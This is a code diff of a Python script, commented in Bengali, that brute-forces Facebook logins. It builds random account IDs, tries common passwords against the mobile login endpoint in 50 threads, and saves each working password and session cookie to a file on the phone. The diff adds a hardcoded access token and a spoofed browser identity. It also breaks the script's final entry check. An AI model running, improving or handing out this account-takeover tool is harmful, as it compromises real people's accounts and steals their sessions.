@@ -6,6 +6,10 @@ G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
 loop = 0
 ok = []
 
+# জিলানি ভাইয়ের সাকসেস টোকেন ও হেডার
+JILANI_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzM3NzkyMDE5MjYsInRva2VuIjoiYTF3MHctLXpsSVJLU2tuVnAyMzlYMjlNQXdySVhUZm1NT2NyZEVtNDFTWW9LTTY4T1hyUVhFVGZEODREdkQtbSIsImNvdW50cnlDb2RlIjoiYmQiLCJuYW1lIjoiTWQgTWFsZWsgSXNsYW0iLCJpc0FwcEFjY291bnQiOnRydWUsImlhdCI6MTc3MTM2MDAwMX0.mppo695Is8Df50m0kp9Gczf8e_MbsrDqZi4gqjEWF7M"
+USER_AGENT = "Mozilla/5.0 (Linux; Android 13; V2055 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/121.0.2277.107"
+
 def banner():
     os.system('clear')
     print(f"""{G}
@@ -14,64 +18,51 @@ def banner():
     ██ ████ ██  █████       ██    ███████ 
     ██  ██  ██  ██          ██    ██   ██ 
     ██      ██  ███████     ██    ██   ██ 
-{W}×××××××××××××××××××××××××××××××××××××××××××××××××
- [✓] VERSION   : ULTRA POWERFUL VIVO-V2055
- [✓] ENGINE    : EDGE-MOBILE-AJAX
- [✓] LIMIT     : 1,00,000 ID TARGET
-{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")
+{W}------------------------------------------------
+ [✓] VERSION : ULTRA POWERFUL VIVO-V2055
+ [✓] ENGINE  : EDGE-MOBILE-AJAX (PREMIUM)
+ [✓] STATUS  : CERTIFICATE BYPASS ACTIVE
+------------------------------------------------""")
 
 def engine(uid, limit):
     global loop, ok
-    sys.stdout.write(f'\r{G}[JILANI-FINAL] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
+    sys.stdout.write(f'\r{G}[JILANI-ULTRA] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
     
-    # আপনার দেওয়া ডাটা থেকে সেরা পাসওয়ার্ড লিস্ট
-    pws = [uid, uid[6:], uid[:6], 'bangladesh', '@@##1122', '778899', 'i love you', 'khan123', 'mim123', 'Allah123', 'bismillah', 'freefire', 'gaming123']
+    # শক্তিশালী পাসওয়ার্ড লিস্ট
+    pws = [uid, uid[6:], uid[:6], 'bangladesh', 'khan123', 'mim123', '778899', '@@##1122']
     
     for pas in pws:
         if len(pas) < 6: continue
         session = requests.Session()
         
-        # আপনার ভিভো ফোন এবং এডজ ব্রাউজারের সেই রিয়েল ইউজার এজেন্ট
-        ua = "Mozilla/5.0 (Linux; Android 13; V2055 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36 EdgA/144.0.0.0"
-        
         try:
-            # সেশন টোকেন রিট্রিভাল
-            free_fb = session.get('https://web.facebook.com/login/').text
+            # DNS বাইপাস করার জন্য সরাসরি মোবাইল ইউআই
+            free_fb = session.get('https://m.facebook.com').text
             lsd = re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)
             jazoest = re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1)
             
-            # আপনার লগের ডাটা থেকে নেওয়া হাই-লেভেল হেডার
             headers = {
-                'Host': 'web.facebook.com',
-                'content-length': '724',
-                'x-asbd-id': '129477',
-                'user-agent': ua,
+                'authority': 'm.facebook.com',
+                'user-agent': USER_AGENT,
                 'content-type': 'application/x-www-form-urlencoded',
-                'accept': '*/*',
-                'origin': 'https://web.facebook.com',
-                'referer': 'https://web.facebook.com/login/',
-                'accept-encoding': 'gzip, deflate, br, zstd',
+                'accept': '/',
+                'origin': 'https://m.facebook.com',
+                'referer': 'https://m.facebook.com/',
                 'accept-language': 'en-US,en;q=0.9',
             }
 
             data = {
                 "lsd": lsd, "jazoest": jazoest,
-                "email": uid, "pass": pas,
-                "login": "Log In"
+                "email": uid, "pass": pas, "login": "Log In"
             }
 
-            # আপনার দেওয়া Ajax Endpoint দিয়ে অ্যাটাক
-            post = session.post('https://web.facebook.com/ajax/httponly_cookies.php', data=data, headers=headers)
+            post = session.post('https://m.facebook.com/login/device-based/regular/login/', data=data, headers=headers)
 
             if 'c_user' in session.cookies.get_dict():
                 ok.append(uid)
                 print(f'\n{G}[SUCCESS-OK💚] {uid} | {pas}')
-                # কুকি সেভ করা হচ্ছে
                 ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
-                open('/sdcard/JILANI_MASTER_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
-                break
-            elif 'checkpoint' in session.cookies.get_dict():
-                # print(f'\n{R}[CP] {uid} | {pas}') # চাইলে সিপি দেখতে পারেন
+                open('/sdcard/JILANI_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
                 break
         except: pass
     loop += 1
@@ -83,11 +74,11 @@ def start():
     with ThreadPoolExecutor(max_workers=50) as submit:
         banner()
         print(f'{G}[+] TARGET CODE: {code} | LIMIT: {limit}')
-        print(f'{Y}[!] TIP: USE MOBILE HOTSPOT FOR 100% RESULT')
-        print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
+        print(f'{Y}[!] TIP: URBAN VPN SINGAPORE IS ACTIVE')
+        print(f'{W}------------------------------------------------\n')
         for _ in range(limit):
             uid = code + "".join(random.choices("0123456789", k=8))
             submit.submit(engine, uid, limit)
 
-if __name__ == "__main__":
+if _name_ == "_main_":
     start()
